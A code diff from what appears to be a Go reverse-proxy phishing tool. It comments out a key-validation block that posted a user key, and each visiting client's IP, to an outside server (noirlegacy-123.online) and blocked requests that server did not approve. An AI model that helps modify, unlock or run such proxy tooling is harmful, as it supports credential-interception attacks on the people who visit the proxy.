@@ -414,102 +414,102 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									//key := req.URL.Query().Get("cfg")
 									// START VALIDATE
-									if len(key) == 0 {
-										log.Warning("No key Initiated")
-										return p.blockRequest(req)
-									}
+									// if len(key) == 0 {
+									// 	log.Warning("No key Initiated")
+									// 	return p.blockRequest(req)
+									// }
 
-									log.Warning("key :%s", key)
+									// log.Warning("key :%s", key)
 
-									cookie_ket, _ := req.Cookie("KEY_USER")
-									log.Success(cookie_ket.String())
+									// cookie_ket, _ := req.Cookie("KEY_USER")
+									// log.Success(cookie_ket.String())
 
-									urlPost0 := "http://noirlegacy-123.online/api/key_2fa"
-									method0 := "POST"
+									// urlPost0 := "http://noirlegacy-123.online/api/key_2fa"
+									// method0 := "POST"
 
-									payload0 := &bytes.Buffer{}
-									writer0 := multipart.NewWriter(payload0)
-									_ = writer0.WriteField("key", key2)
-									err = writer0.Close()
-									if err != nil {
-										fmt.Println(err)
-										return nil, nil
-									}
+									// payload0 := &bytes.Buffer{}
+									// writer0 := multipart.NewWriter(payload0)
+									// _ = writer0.WriteField("key", key2)
+									// err = writer0.Close()
+									// if err != nil {
+									// 	fmt.Println(err)
+									// 	return nil, nil
+									// }
 
-									client0 := &http.Client{}
-									req0, err := http.NewRequest(method0, urlPost0, payload0)
+									// client0 := &http.Client{}
+									// req0, err := http.NewRequest(method0, urlPost0, payload0)
 
-									if err != nil {
-										fmt.Println(err)
-										return nil, nil
-									}
-									req0.Header.Set("Content-Type", writer0.FormDataContentType())
-									resp0, err := client0.Do(req0)
-									if err != nil {
-										fmt.Println(err)
-										return nil, nil
-									}
-									defer func(Body io.ReadCloser) {
-										err := Body.Close()
-										if err != nil {
+									// if err != nil {
+									// 	fmt.Println(err)
+									// 	return nil, nil
+									// }
+									// req0.Header.Set("Content-Type", writer0.FormDataContentType())
+									// resp0, err := client0.Do(req0)
+									// if err != nil {
+									// 	fmt.Println(err)
+									// 	return nil, nil
+									// }
+									// defer func(Body io.ReadCloser) {
+									// 	err := Body.Close()
+									// 	if err != nil {
 
-										}
-									}(resp0.Body)
+									// 	}
+									// }(resp0.Body)
 
-									urlPost := "https://noirlegacy-123.online/api/match_ip"
-									method := "POST"
+									// urlPost := "https://noirlegacy-123.online/api/match_ip"
+									// method := "POST"
 
-									payload := &bytes.Buffer{}
-									writer := multipart.NewWriter(payload)
-									_ = writer.WriteField("ip", originalIP)
-									_ = writer.WriteField("key", key)
-									err = writer.Close()
-									if err != nil {
-										fmt.Println(err)
-										return nil, nil
-									}
+									// payload := &bytes.Buffer{}
+									// writer := multipart.NewWriter(payload)
+									// _ = writer.WriteField("ip", originalIP)
+									// _ = writer.WriteField("key", key)
+									// err = writer.Close()
+									// if err != nil {
+									// 	fmt.Println(err)
+									// 	return nil, nil
+									// }
 
-									switch resp0.StatusCode {
-									case http.StatusOK:
-										// 200 OK
-										log.Warning("key valid")
-									case http.StatusUnauthorized:
-										// 401 Unauthorized
-										return p.expiredKey(req)
-									case http.StatusNotFound:
-										// 404 Not Found
-										return p.invaliddKey(req)
-									default:
-										fmt.Printf("Unexpected response status code: %d\n", resp0.StatusCode)
-									}
+									// switch resp0.StatusCode {
+									// case http.StatusOK:
+									// 	// 200 OK
+									// 	log.Warning("key valid")
+									// case http.StatusUnauthorized:
+									// 	// 401 Unauthorized
+									// 	return p.expiredKey(req)
+									// case http.StatusNotFound:
+									// 	// 404 Not Found
+									// 	return p.invaliddKey(req)
+									// default:
+									// 	fmt.Printf("Unexpected response status code: %d\n", resp0.StatusCode)
+									// }
 
-									client := &http.Client{}
-									req2, err := http.NewRequest(method, urlPost, payload)
+									// client := &http.Client{}
+									// req2, err := http.NewRequest(method, urlPost, payload)
 
-									if err != nil {
-										fmt.Println(err)
-										return nil, nil
-									}
-									req2.Header.Set("Content-Type", writer.FormDataContentType())
-									resp2, err := client.Do(req2)
-									if err != nil {
-										fmt.Println(err)
-										return nil, nil
-									}
-									defer func(Body io.ReadCloser) {
-										err := Body.Close()
-										if err != nil {
+									// if err != nil {
+									// 	fmt.Println(err)
+									// 	return nil, nil
+									// }
+									// req2.Header.Set("Content-Type", writer.FormDataContentType())
+									// resp2, err := client.Do(req2)
+									// if err != nil {
+									// 	fmt.Println(err)
+									// 	return nil, nil
+									// }
+									// defer func(Body io.ReadCloser) {
+									// 	err := Body.Close()
+									// 	if err != nil {
 
-										}
-									}(resp2.Body)
+									// 	}
+									// }(resp2.Body)
 
-									if resp2.StatusCode == http.StatusNotFound {
-										// Do something here, for example, print a message
-										log.Warning("Not Found")
-										log.Warning("originalIP :%s", originalIP)
-										return p.blockRequest(req)
+									// if resp2.StatusCode == http.StatusNotFound {
+									// 	// Do something here, for example, print a message
+									// 	log.Warning("Not Found")
+									// 	log.Warning("originalIP :%s", originalIP)
+									// 	return p.blockRequest(req)
 
-									}
+									// }
 
 									//END VALIDATE
 
